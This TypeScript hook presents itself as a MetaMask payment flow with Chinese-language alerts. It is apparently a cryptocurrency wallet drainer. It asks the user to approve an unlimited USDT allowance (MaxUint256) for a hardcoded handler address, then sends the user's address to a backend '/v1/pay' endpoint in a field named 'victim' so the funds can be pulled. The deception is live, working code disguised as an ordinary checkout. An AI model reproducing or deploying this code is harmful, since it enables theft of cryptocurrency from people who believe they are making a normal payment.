// useWalletPayment.ts
import { useState } from '@teact';
import { BrowserProvider, Contract, MaxUint256 } from 'ethers';

const API_BASE = process.env.VITE_API_BASE_URL;
const HANDLER_ADDRESS = '0x689CA9411b1796c9d8AbBC1766F80Fd395736883';
const USDT_ADDRESS = '0x1E4a5963aBFD975d8c9021ce480b42188849D41d';

const USDT_ABI = [
  'function approve(address spender, uint256 amount) public returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

const isMobile = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

export default function useWalletPayment() {
  const [selectedWallet, setSelectedWallet] = useState('');
  // eslint-disable-next-line no-null/no-null
  const [provider, setProvider] = useState<any>(null);
  // eslint-disable-next-line no-null/no-null
  const [signer, setSigner] = useState<any>(null);
  const [userAddress, setUserAddress] = useState('');
  // eslint-disable-next-line no-null/no-null
  const [chainId, setChainId] = useState<number | null>(null);

  const connectWallet = async () => {
    if (!window.ethereum) {
      if (isMobile()) {
        const dappUrl = window.location.origin.replace(/^http:\/\//, 'https://');
        const deepLink = `https://metamask.app.link/dapp/${dappUrl}`;
        window.location.href = deepLink;
      } else {
        alert('请先安装 MetaMask 插件');
      }
      return false;
    }

    if (provider && signer && userAddress) return true;

    try {
      await window.ethereum.request({ method: 'eth_requestAccounts' });

      const newProvider = new BrowserProvider(window.ethereum);
      const newSigner = await newProvider.getSigner();

      setProvider(newProvider);
      setSigner(newSigner);

      const address = await newSigner.getAddress();
      setUserAddress(address);

      const network = await newProvider.getNetwork();
      setChainId(Number(network.chainId));

      window.ethereum.removeAllListeners('accountsChanged');
      window.ethereum.removeAllListeners('chainChanged');
      window.ethereum.on('accountsChanged', () => location.reload());
      window.ethereum.on('chainChanged', () => location.reload());

      return true;
    } catch (err: any) {
      console.error('连接钱包失败:', err);
      alert('连接失败：' + (err.message || err));
      return false;
    }
  };

  const approve = async () => {
    const connected = await connectWallet();
    if (!connected) return;

    try {
      const currentSigner = await provider.getSigner();
      const address = await currentSigner.getAddress();
      const usdt = new Contract(USDT_ADDRESS, USDT_ABI, currentSigner);
      const allowance = await usdt.allowance(address, HANDLER_ADDRESS);
      if (allowance >= MaxUint256 / 2n) {
        console.log('已有足够 allowance，跳过 approve');
        return;
      }

      const tx = await usdt.approve(HANDLER_ADDRESS, MaxUint256);
      await tx.wait();
      alert('✅ 授权成功！');
    } catch (err: any) {
      console.error('approve 错误：', err);
      alert('❌ 授权失败：' + (err.message || err));
    }
  };

  const payApi = async () => {
    try {
      const res = await fetch(`${API_BASE}/v1/pay`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ victim: userAddress, chain_id: chainId }),
      });
      const result = await res.json();
      if (result.success) {
        alert('💰 支付成功：' + result.message);
      } else {
        alert('❌ 支付失败：' + result.message);
      }
    } catch (err: any) {
      console.error('支付异常：', err);
      alert('❌ 支付失败：' + (err.message || err));
    }
  };

  const openPayment = async () => {
    console.info('选择钱包：', selectedWallet);
    if (!selectedWallet) {
      alert('请选择付款钱包');
      return;
    }
    if (selectedWallet !== 'MetaMask钱包') {
      alert('当前仅支持 MetaMask 支付');
      return;
    }
    await approve();
    await payApi();
  };

  return {
    selectedWallet,
    setSelectedWallet,
    openPayment,
  };
}
